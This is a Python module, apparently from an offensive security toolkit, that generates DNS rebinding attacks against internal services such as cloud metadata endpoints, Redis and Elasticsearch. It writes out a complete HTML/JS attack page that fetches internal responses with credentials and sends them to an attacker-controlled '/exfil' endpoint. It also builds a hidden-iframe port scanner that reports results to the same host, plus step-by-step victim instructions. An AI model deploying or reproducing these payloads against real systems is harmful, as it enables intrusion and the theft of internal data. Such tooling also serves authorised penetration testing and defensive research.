#!/usr/bin/python3
"""
DNS Rebinding Payload Generator — inspired by Singularity and rebinding.network.

DNS rebinding bypasses Same-Origin Policy by making a domain resolve first to
an attacker server, then re-resolve to an internal IP (127.0.0.1, 192.168.x.x).
The browser's cached response has the attacker's origin, but subsequent XHRs
hit the internal service.

Generates: HTML/JS attack pages, DNS record suggestions, scanner payloads.

Usage:
  ../.venv/bin/python3 modules/dns_rebinding.py --attacker-domain rebind.attacker.com --target 127.0.0.1 --port 8080
  ../.venv/bin/python3 modules/dns_rebinding.py --attacker-domain x.oast.me --scan
"""
import argparse
import ipaddress
import json

from core.colors import bold, underline, end, red, yellow, green, run, good, bad, info, tab


INTERNAL_RANGES = [
    "127.0.0.1",
    "127.0.0.2",
    "0.0.0.0",
    "169.254.169.254",   # AWS/GCP/Azure metadata
    "169.254.170.2",     # ECS metadata
    "100.100.100.200",   # Alibaba Cloud metadata
    "192.168.0.1",
    "192.168.1.1",
    "10.0.0.1",
    "172.16.0.1",
    "::1",               # IPv6 loopback
    "[::1]",
]

COMMON_INTERNAL_PORTS = [
    (80,    "HTTP"),
    (443,   "HTTPS"),
    (8080,  "HTTP alt"),
    (8443,  "HTTPS alt"),
    (8888,  "Jupyter / dev server"),
    (3000,  "Node.js / Grafana"),
    (4200,  "Angular dev"),
    (5000,  "Flask / Docker registry"),
    (5601,  "Kibana"),
    (6379,  "Redis"),
    (8500,  "Consul"),
    (9200,  "Elasticsearch"),
    (9090,  "Prometheus"),
    (27017, "MongoDB"),
]


def dns_record_suggestions(attacker_domain: str, target_ip: str) -> list[str]:
    """What DNS records to set up for the rebinding to work."""
    subdomain = f"rebind.{attacker_domain}"
    return [
        f"# Initial resolution: returns attacker IP (e.g. your VPS)",
        f"{subdomain}   60 IN A  <YOUR_ATTACKER_IP>",
        f"",
        f"# After TTL expires, return the target internal IP",
        f"# (configure your custom DNS server to alternate between both)",
        f"{subdomain}   1  IN A  {target_ip}",
        f"",
        f"# Use singularity (github.com/nccgroup/singularity) or",
        f"# rebinding.network for automated DNS rebinding",
        f"# Set TTL to 1 second so browser re-resolves quickly",
    ]


def attack_page_html(attacker_domain: str, target_ip: str, port: int) -> str:
    subdomain = f"rebind.{attacker_domain}"
    return f"""<!DOCTYPE html>
<html>
<head>
  <title>DNS Rebinding PoC</title>
  <style>
    body {{ font-family: monospace; background: #1e2227; color: #c8c8c8; padding: 20px; }}
    pre  {{ background: #12171c; padding: 12px; border: 1px solid #333; }}
    .ok  {{ color: #73c990; }}
    .err {{ color: #f44747; }}
  </style>
</head>
<body>
  <h2>DNS Rebinding PoC — <span id="status">waiting...</span></h2>
  <p>Target: <b>http://{subdomain}:{port}/</b></p>
  <pre id="log"></pre>

  <script>
    const TARGET = 'http://{subdomain}:{port}';
    const POLL_INTERVAL = 2000;   // ms between re-checks
    const MAX_ATTEMPTS  = 30;
    let attempts = 0;
    const log = document.getElementById('log');
    const status = document.getElementById('status');

    function addLog(msg, cls='') {{
      const line = document.createElement('span');
      line.className = cls;
      line.textContent = new Date().toISOString().slice(11,19) + ' ' + msg + '\\n';
      log.appendChild(line);
    }}

    async function probe() {{
      attempts++;
      addLog(`Attempt ${{attempts}}: fetching ${{TARGET}}/`);
      try {{
        const r = await fetch(TARGET + '/', {{
          mode: 'cors',
          cache: 'no-store',
          credentials: 'include',
        }});
        const body = await r.text();
        addLog('SUCCESS! Status: ' + r.status, 'ok');
        addLog('Response length: ' + body.length + ' bytes', 'ok');
        addLog('First 500 chars:\\n' + body.slice(0, 500), 'ok');
        status.textContent = '✓ REBINDING SUCCEEDED';
        status.className = 'ok';

        // Exfiltrate to attacker server
        fetch('http://{attacker_domain}/exfil?data=' + encodeURIComponent(body.slice(0, 2000)));
      }} catch(e) {{
        addLog('Not yet / blocked: ' + e.message);
        if (attempts < MAX_ATTEMPTS) {{
          setTimeout(probe, POLL_INTERVAL);
        }} else {{
          addLog('Max attempts reached. DNS TTL may not have expired yet.', 'err');
          status.textContent = '✗ did not succeed';
          status.className = 'err';
        }}
      }}
    }}

    // Wait for DNS TTL to expire then start probing
    addLog('Waiting 5s for initial page load / DNS TTL...');
    setTimeout(probe, 5000);
  </script>
</body>
</html>"""


def scanner_payloads(attacker_domain: str) -> list[dict]:
    """Payloads to detect internal services susceptible to rebinding."""
    payloads = []
    for ip in INTERNAL_RANGES[:4]:   # most common
        for port, svc in COMMON_INTERNAL_PORTS:
            payloads.append({
                "target_ip":   ip,
                "port":        port,
                "service":     svc,
                "attack_url":  f"http://rebind.{attacker_domain}:{port}/",
                "description": f"Probe {svc} on {ip}:{port}",
            })
    return payloads


def iframe_chain(attacker_domain: str, target_ip: str, ports: list[int]) -> str:
    """Multi-port scanner using hidden iframes — faster than sequential fetch."""
    frames = "\n  ".join(
        f'<iframe src="http://rebind.{attacker_domain}:{p}/" '
        f'onload="loaded({p})" onerror="failed({p})" style="display:none"></iframe>'
        for p in ports
    )
    return f"""<!-- Embed in your attack page to probe multiple ports simultaneously -->
<div id="probes">
  {frames}
</div>
<script>
  const results = {{}};
  function loaded(port) {{ results[port] = 'open'; report(); }}
  function failed(port) {{ results[port] = 'error'; report(); }}
  function report() {{
    if (Object.keys(results).length === {len(ports)}) {{
      fetch('http://{attacker_domain}/ports?r=' + encodeURIComponent(JSON.stringify(results)));
    }}
  }}
</script>"""


def generate(attacker_domain: str, target_ip: str, port: int, output: str | None = None) -> dict:
    result = {
        "attacker_domain":    attacker_domain,
        "target_ip":          target_ip,
        "port":               port,
        "dns_records":        dns_record_suggestions(attacker_domain, target_ip),
        "attack_page":        attack_page_html(attacker_domain, target_ip, port),
        "scanner_payloads":   scanner_payloads(attacker_domain),
        "iframe_chain":       iframe_chain(attacker_domain, target_ip,
                                           [p for p, _ in COMMON_INTERNAL_PORTS[:8]]),
    }

    if output:
        with open(output, "w") as f:
            f.write(result["attack_page"])
        print(f"{good} Attack page saved to: {output}")

    return result


def main():
    parser = argparse.ArgumentParser(description="Generate DNS rebinding attack payloads")
    parser.add_argument("--attacker-domain", required=True,
                        help="Domain you control (e.g. rebind.attacker.com)")
    parser.add_argument("--target", default="127.0.0.1",
                        help="Internal IP to rebind to (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=8080,
                        help="Target port (default: 8080)")
    parser.add_argument("--output", "-o", help="Save attack HTML to file")
    parser.add_argument("--scan", action="store_true",
                        help="List all internal IP:port combinations to probe")
    args = parser.parse_args()

    print(f"\n{bold}DNS Rebinding Generator{end}\n")
    print(f"  {info} Attacker domain : {green}{args.attacker_domain}{end}")
    print(f"  {info} Rebind target   : {yellow}{args.target}:{args.port}{end}\n")

    result = generate(args.attacker_domain, args.target, args.port, args.output)

    if args.scan:
        print(f"\n{bold}{underline}Internal Probe Targets{end}\n")
        for p in result["scanner_payloads"]:
            print(f"  {tab}{p['target_ip']:<20} :{p['port']:<6} {p['service']}")
    else:
        print(f"{bold}{underline}DNS Records to Configure{end}\n")
        for line in result["dns_records"]:
            print(f"  {line}")

        print(f"\n{bold}{underline}Attack Page{end}")
        print(f"  {info} Host attack_page HTML on {green}http://rebind.{args.attacker_domain}:{args.port}/{end}")
        if not args.output:
            print(f"  {info} Use --output rebind.html to save to file")
        print(f"\n{bold}{underline}How it works{end}\n")
        print(f"  1. Victim visits http://rebind.{args.attacker_domain}:{args.port}/attack.html")
        print(f"  2. DNS resolves to YOUR IP — page loads, JS runs")
        print(f"  3. After ~5s TTL expires, DNS rebinds to {args.target}")
        print(f"  4. JS fetches http://rebind.{args.attacker_domain}:{args.port}/ → hits {args.target}:{args.port}")
        print(f"  5. Response exfiltrated to your server\n")


if __name__ == "__main__":
    main()
